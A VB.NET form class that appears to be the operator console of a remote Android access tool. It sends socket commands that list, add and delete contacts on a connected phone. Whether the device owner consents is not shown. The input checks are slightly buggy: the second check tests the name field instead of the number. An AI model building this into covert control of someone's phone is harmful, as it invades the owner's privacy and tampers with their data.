Public Class Android_contactsmanager
    Public sock As Integer
    Private cbn As Integer = 0


    Private Sub AddContactToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles AddContactToolStripMenuItem.Click
        Dim pname As String = InputBox("Enter Contact name : ", "Create new Phone Contact", "New contact" & cbn)
        If pname.Length > 1 Then
            Dim pnum As String = InputBox("Enter " & pname & " Phone number ", "Create new Phone Contact", "")
            If pname.Length > 1 Then
                Form1.Server.Send_DX(sock, "contacts_manager_write" & SplitData & pname & SplitData & pnum & SplitData)
                ListView1.Items.Clear()
                Form1.Server.Send_DX(sock, "contacts_manager")

            Else
                MsgBox("contact number must be more than two digits", "Create new Phone Contact", MsgBoxStyle.Critical)
            End If
        Else
            MsgBox("contact name must be more than two letters", "Create new Phone Contact", MsgBoxStyle.Critical)
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        ListView1.Items.Clear()
        Form1.Server.Send_DX(sock, "contacts_manager")

    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DeleteToolStripMenuItem.Click

        If ListView1.SelectedItems.Count = 1 Then
            Dim result As Integer = MessageBox.Show("This action will delete the selected contact" & vbNewLine & "Are you sure to Delete this contact from Android device ?", "Confirm Log Delete", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
            If result = DialogResult.No Then
                Exit Sub
            ElseIf result = DialogResult.Yes Then

                Dim callentry As String = ListView1.SelectedItems(0).Text

                Form1.Server.Send_DX(sock, "contacts_manager_delete" & SplitData & callentry & SplitData)

                ListView1.Items.Clear()
                Form1.Server.Send_DX(sock, "contacts_manager")
            End If
            '
        End If
    End Sub

    Private Sub Android_contactsmanager_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load

    End Sub
End Class